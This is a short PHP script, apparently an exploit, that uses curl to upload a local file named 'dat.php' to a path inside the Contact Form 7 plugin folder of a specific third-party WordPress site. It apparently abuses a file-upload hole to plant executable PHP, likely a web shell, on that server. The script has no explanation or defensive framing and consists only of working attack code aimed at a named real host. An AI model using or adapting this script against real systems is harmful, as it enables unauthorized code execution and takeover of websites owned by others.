<?php
$shahab="dat.php";
$ch = curl_init("http://coopa.coop.br/blog/wp-content/plugins/contact-form-7/modules/dat.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('zip'=>"@$shahab"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
print "$result";
?>
